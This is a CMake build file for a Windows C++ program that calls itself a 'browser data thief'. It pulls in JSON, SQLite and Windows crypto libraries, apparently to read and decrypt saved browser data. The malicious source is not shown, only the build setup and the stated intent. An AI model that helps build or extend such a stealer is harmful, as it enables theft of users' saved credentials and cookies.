set(CMAKE_POLICY_DEFAULT_CMP0077 NEW)

project(bthief LANGUAGES CXX DESCRIPTION "browser data thief")

include(FetchContent)

FetchContent_Declare(
    wil
    GIT_REPOSITORY https://github.com/microsoft/wil.git
    GIT_TAG 23fca640eae099f9120545483ae7d5d0a98a6fa5 # updated 2022-02-07
)
set(WIL_BUILD_TESTS OFF)

FetchContent_Declare(
    json
    GIT_REPOSITORY https://github.com/nlohmann/json.git
    GIT_TAG v3.10.5 # updated 2022-02-07
)

FetchContent_Declare(
    sqlite
    URL https://sqlite.org/2022/sqlite-amalgamation-3370200.zip # updated 2022-02-22
    URL_HASH SHA3_256=7f535314ac30f1c7847df2a66a9e16a322f55dae6e83b264178cf02114cd0617
)

FetchContent_MakeAvailable(wil json sqlite)

add_executable(${PROJECT_NAME} src/main.cxx src/nowide.cxx src/browser.cxx src/crypto.cxx ${sqlite_SOURCE_DIR}/sqlite3.c)

target_compile_features(${PROJECT_NAME} PRIVATE cxx_std_17)
target_compile_definitions(${PROJECT_NAME} PRIVATE UNICODE _UNICODE WIN32_LEAN_AND_MEAN)
target_include_directories(${PROJECT_NAME} PRIVATE ${sqlite_SOURCE_DIR})

target_link_libraries(${PROJECT_NAME} Bcrypt Crypt32 WIL nlohmann_json::nlohmann_json)